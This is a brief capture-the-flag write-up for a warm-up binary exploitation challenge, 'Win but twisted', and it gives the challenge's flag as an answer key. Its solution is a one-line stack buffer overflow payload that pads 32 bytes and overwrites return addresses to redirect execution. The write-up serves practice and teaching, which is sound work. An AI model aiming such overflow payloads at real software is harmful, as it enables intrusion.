# Win but twisted

### Category

Pwn

### Description

Just a little warm up, but hey, without the twist it would've been too simple.
Get the flag from the server.

Format : **Hero{flag}**
Author : **iHuggsy**

### Write up

```py
(python2 -c "print('A'*32 +'\xc6\x91\x04\x08' + '\xfa\x91\x04\x08')" ; cat) | ./x
```

### Flag

Hero{Tw1sT3D_w1N_FuNcTi0N}